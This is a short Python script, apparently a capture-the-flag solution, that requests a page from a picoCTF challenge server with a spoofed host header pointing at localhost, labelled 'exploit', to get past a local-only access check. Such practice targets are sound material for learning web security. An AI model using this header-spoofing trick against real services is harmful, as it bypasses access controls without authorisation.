import requests

s = requests.Session()

exploit = {
    'host' : 'http://127.0.0.1:8080'
}

resp = s.get("http://mercury.picoctf.net:27393/index.html", headers=exploit)

print(resp.text)